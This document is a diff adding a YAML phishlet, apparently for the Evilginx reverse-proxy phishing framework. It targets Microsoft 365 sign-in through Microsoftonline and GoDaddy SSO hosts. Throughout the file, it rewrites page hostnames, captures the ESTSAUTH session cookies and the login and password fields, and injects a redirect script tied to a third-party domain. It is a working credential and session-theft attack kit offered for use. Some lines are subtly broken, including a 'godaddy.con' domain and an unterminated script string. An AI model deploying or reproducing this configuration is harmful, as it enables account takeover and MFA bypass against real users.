@@ -1,0 +1,86 @@
+name: 'o365'
+author: '@simplerhacking'
+min_ver: '3.0.0'
+proxy_hosts:
+  - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: false }
+  - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "acc", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: 'gui', orig_sub: 'gui', domain: 'godaddy.com', session: true, is_landing:false,  auto_filter: false }
+  - { phish_sub: 'csp', orig_sub: 'csp', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: false }
+  - { phish_sub: 'reporting', orig_sub: 'reporting', domain: 'cdndex.io', session: false, is_landing:false, auto_filter: false }
+  - { phish_sub: 'sso', orig_sub: 'sso', domain: 'godaddy.com', session: true, is_landing:false, auto_filter: false }
+  - { phish_sub: '', orig_sub: '', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: 'events.api', orig_sub: 'events.api', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false }
+  - {phish_sub: 'g.sst', orig_sub: 'g.sst', domain: 'godaddy.com', session: true, is_landing: false, auto_filter: false }
+  - {phish_sub: 'ssl', orig_sub: 'compass-ssl', domain: 'microsoft.com', session: true, is_landing: false, auto_filter: false }
+
+sub_filters:
+
+  - {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'account.microsoft.com', orig_sub: 'account', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'account.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'account.microsoft.com', orig_sub: 'www', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'account.microsoft.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'account.microsoft.com', orig_sub: 'compass-ssl', domain: 'microsoft.com', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'account.microsoft.com', orig_sub: 'logincdn', domain: 'msauth.net', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - {triggers_on: 'account.microsoft.com', orig_sub: 'logincdn', domain: 'msauth.net', search: '''{domain}'';', replace: '''{domain}'';', mimes: ['text/html', 'application/json', 'application/x-javascript']}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "csp", domain: "godaddy.com", search: "https://{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "csp", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript], redirect_only: true}
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https%3A%2F%2F{hostname}", replace: "https%3A%2F%2F{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "sso.godaddy.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "sso", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "gui.godaddy.com", orig_sub: "gui", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "gui.godaddy.com", orig_sub: "gui", domain: "godaddy.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "csp.godaddy.com", orig_sub: "csp", domain: "godaddy.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "account", domain: "microsoft.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript] }
+
+  ##
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "www", domain: "office.com", search: "{hostname}", replace: "{hostname}", mimes: ["text/html", "text/javascript", "application/json"] }
+  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - { triggers_on: 'csp.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'csp.godaddy.com', orig_sub: 'csp', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - { triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - { triggers_on: 'gui.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'href="https://{hostname}}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'gui.godaddy.com', orig_sub: 'gui', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - { triggers_on: 'g.sst.godaddy.com', orig_sub: 'g.sst', domain: 'godaddy.con', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'g.sst.godaddy.com', orig_sub: 'g.sst', domain: 'godaddy.com', search: 'https%3A%2F%2F{hostname}', replace: 'https%3A%2F%2F{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'] }
+  - { triggers_on: 'g.sst.godaddy.com', orig_sub: 'g.sst', domain: 'godaddy.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - { triggers_on: "login.microsoftonline.com", orig_sub: "login", domain: "microsoftonline.com", search: "https://{hostname}", replace: "https://{hostname}", mimes: ["text/html", "application/json", "application/javascript", "application/x-javascript", text/javascript], redirect_only: true }
+  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - { triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - { triggers_on: 'sso.godaddy.com', orig_sub: 'sso', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - { triggers_on: 'events.api.godaddy.com', orig_sub: 'events.api', domain: 'godaddy.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT']
+  - domain: 'login.microsoftonline.com'
+    keys: ['SignInStateCookie']    
+
+
+credentials:
+  username:
+    key: 'login'
+    search: '(.*)'
+    type: 'json'
+  password:
+    key: 'passwd'
+    search: '(.*)'
+    type: 'json'
+auth_urls:
+  - '/common/SAS/ProcessAuth'
+  - '/kmsi'
+login:
+  domain: "login.microsoftonline.com"
+  path: "/"
+  
+js_inject:
+   - trigger_domains: ["accessoriesdirects.com"]
+     trigger_paths: ["/path/trigger"]
+     trigger_params: []
+     script: document.location = "https://login.microsoftonline.com;
